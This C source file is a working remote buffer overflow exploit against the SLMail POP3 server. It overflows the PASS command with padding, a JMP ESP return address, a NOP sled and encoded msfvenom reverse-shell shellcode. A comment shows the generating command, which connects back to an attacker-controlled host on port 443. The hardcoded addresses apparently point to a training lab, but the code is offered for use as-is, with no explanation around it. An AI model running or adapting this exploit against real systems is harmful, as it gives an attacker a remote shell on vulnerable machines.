#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
//#define retadd "\x8f\x35\x4a\x5f" /*JMP ESP in SLMFC.dll 0x5f4a358f*/
#define retadd "\x8f\x35\x4a\x5f"
#define port 110

/* revshell msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.100 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"*/
//unsigned char shellcode[] =
unsigned char shellcode[] =
"\xbd\xbd\xdb\x4d\x53\xd9\xcc\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xef\xfc\x31\x6f\x0e\x03\xd2\xd5\xaf\xa6\xd0\x02\xad"
"\x49\x28\xd3\xd2\xc0\xcd\xe2\xd2\xb7\x86\x55\xe3\xbc\xca\x59"
"\x88\x91\xfe\xea\xfc\x3d\xf1\x5b\x4a\x18\x3c\x5b\xe7\x58\x5f"
"\xdf\xfa\x8c\xbf\xde\x34\xc1\xbe\x27\x28\x28\x92\xf0\x26\x9f"
"\x02\x74\x72\x1c\xa9\xc6\x92\x24\x4e\x9e\x95\x05\xc1\x94\xcf"
"\x85\xe0\x79\x64\x8c\xfa\x9e\x41\x46\x71\x54\x3d\x59\x53\xa4"
"\xbe\xf6\x9a\x08\x4d\x06\xdb\xaf\xae\x7d\x15\xcc\x53\x86\xe2"
"\xae\x8f\x03\xf0\x09\x5b\xb3\xdc\xa8\x88\x22\x97\xa7\x65\x20"
"\xff\xab\x78\xe5\x74\xd7\xf1\x08\x5a\x51\x41\x2f\x7e\x39\x11"
"\x4e\x27\xe7\xf4\x6f\x37\x48\xa8\xd5\x3c\x65\xbd\x67\x1f\xe2"
"\x72\x4a\x9f\xf2\x1c\xdd\xec\xc0\x83\x75\x7a\x69\x4b\x50\x7d"
"\x8e\x66\x24\x11\x71\x89\x55\x38\xb6\xdd\x05\x52\x1f\x5e\xce"
"\xa2\xa0\x8b\x41\xf2\x0e\x64\x22\xa2\xee\xd4\xca\xa8\xe0\x0b"
"\xea\xd3\x2a\x24\x81\x2e\xbd\x41\x5d\x30\x59\x3e\x63\x30\xa0"
"\x05\xea\xd6\xc8\x69\xbb\x41\x65\x13\xe6\x19\x14\xdc\x3c\x64"
"\x16\x56\xb3\x99\xd9\x9f\xbe\x89\x8e\x6f\xf5\xf3\x19\x6f\x23"
"\x9b\xc6\xe2\xa8\x5b\x80\x1e\x67\x0c\xc5\xd1\x7e\xd8\xfb\x48"
"\x29\xfe\x01\x0c\x12\xba\xdd\xed\x9d\x43\x93\x4a\xba\x53\x6d"
"\x52\x86\x07\x21\x05\x50\xf1\x87\xff\x12\xab\x51\x53\xfd\x3b"
"\x27\x9f\x3e\x3d\x28\xca\xc8\xa1\x99\xa3\x8c\xde\x16\x24\x19"
"\xa7\x4a\xd4\xe6\x72\xcf\xf4\x04\x56\x3a\x9d\x90\x33\x87\xc0"
"\x22\xee\xc4\xfc\xa0\x1a\xb5\xfa\xb9\x6f\xb0\x47\x7e\x9c\xc8"
"\xd8\xeb\xa2\x7f\xd8\x39";
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
//    memset(off, 0x41, 2605);
    memset(off, 0x41, 2606);
//    char *nop = malloc(13);
//    memset(nop, 0x00, 13);
//    memset(nop, 0x90, 12);

    char *nop = malloc(8);
    memset(nop, 0x00,8);
    memset(nop, 0x90,8);

    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.25.185");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
